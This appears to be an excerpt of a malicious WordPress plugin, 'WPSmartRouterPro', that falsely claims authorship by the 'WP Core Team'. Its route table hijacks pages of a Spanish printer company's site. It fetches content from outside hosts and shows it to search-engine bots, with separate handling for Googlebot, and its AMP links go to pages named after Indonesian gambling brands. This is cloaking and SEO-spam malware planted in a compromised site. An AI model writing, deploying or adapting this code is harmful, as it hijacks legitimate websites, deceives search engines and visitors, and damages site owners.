 ...
 * Description: Intelligent content routing with enhanced stability and consistency using external files.
 * Version: 3.2.1
 * Author: WP Core Team
...
class WPSmartRouterPro {
    ...
    // ============================================================
    // MAPPING BARU (dari data yang diberikan)
    // Key = path internal (diawali dan diakhiri slash)
    // amp = URL AMP (pages.dev)
    // lp  = URL konten utama (domain eksternal)
    // ============================================================
    private $pages = [
        '/noticias/impresora-casa/' => [
            'amp' => 'https://inforcopy-cor.pages.dev/gebyar4d.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/inforcopy/noticias_impresora_casa.html'
        ],
        '/noticias/historia-impresoras/' => [
            'amp' => 'https://inforcopy-cor.pages.dev/birutoto.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/inforcopy/noticias_historia_impresoras.html'
        ],
        '/alquiler-renting-fotocopiadoras-impresoras/' => [
            'amp' => 'https://inforcopy-cor.pages.dev/nara4d.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/inforcopy/alquiler_renting_fotocopiadoras_impresoras.html'
        ],
        '/venta-fotocopiadoras-impresoras/' => [
            'amp' => 'https://inforcopy-cor.pages.dev/topanhoki.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/inforcopy/venta_fotocopiadoras_impresoras.html'
        ],
        '/mantenimiento-informatico/' => [
            'amp' => 'https://inforcopy-cor.pages.dev/turbo78.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/inforcopy/mantenimiento_informatico.html'
        ],
        '/noticias/conectar-impresora-hp-a-wifi/' => [
            'amp' => 'https://inforcopy-cor.pages.dev/wisnu123.html',
            'lp'  => 'https://project1.proyekngepet.org/ashborn/lp-dir/inforcopy/noticias_conectar_impresora_hp_a_wifi.html'
        ]
    ];
    ...
    // ============================================================
    // SERVE BOT CONTENT – sekarang mengambil dari URL eksternal
    // ============================================================
    private function serve_bot_content($config, $is_googlebot = false) {
        ...
        $lp_url = $config['lp']; // URL eksternal
        
        // Cache key berdasarkan URL dan tanggal
        $day_key = date('Y-m-d');
        ...
        $content = $this->get_external_content($lp_url);
        ...
        if (!$content_valid) {
            // Fallback ke cache lain atau WordPress
        ...
        // Inject JS detection (kecuali Googlebot)
        if (!$is_googlebot) {
    ...
    /**
     * Mengambil konten dari URL eksternal menggunakan wp_remote_get()
     */
    private function get_external_content($url) {
        ...
        if (is_wp_error($response)) {
            $this->log_activity('EXTERNAL_FETCH_ERROR', [
                'url'   => $url,
        ...
        if ($code !== 200) {
            $this->log_activity('EXTERNAL_FETCH_HTTP_ERROR', [
                'url'  => $url,
                'code' => $code
            ]);
            return '';
        ...
        if (empty($body)) {
            $this->log_activity('EXTERNAL_FETCH_EMPTY', ['url' => $url]);
            return '';
        }
...
function wsr_settings_page() {
    ...
    <div class="wrap">
        ...
        <div class="card">
            ...
            <p><strong>Cache Duration:</strong> 2 hours (Googlebot: 1 hour)</p>
            <p><strong>Rate Limit:</strong> 100 requests per hour (Googlebot: 200)</p>
            <p><strong>Active Routes:</strong> <?php echo count($router->pages); ?> paths configured</p>
            <p><strong>Content Source:</strong> <span style="color: #46b450;">External URLs</span> (via wp_remote_get)</p>
        </div>
        <div class="card" style="margin-top:20px;">
            <h2>Mapping Baru (inforcopy.es)</h2>
            <table class="widefat" style="border-collapse:collapse;">
                <thead>
                    <tr><th>Path</th><th>AMP URL</th><th>LP URL</th></tr>
                </thead>
                <tbody>
                    <?php foreach ($router->pages as $path => $config): ?>
                    <tr>
                        <td><code><?php echo esc_html($path); ?></code></td>
                        <td><a href="<?php echo esc_url($config['amp']); ?>" target="_blank"><?php echo esc_html($config['amp']); ?></a></td>
                        <td><a href="<?php echo esc_url($config['lp']); ?>" target="_blank"><?php echo esc_html($config['lp']); ?></a></td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
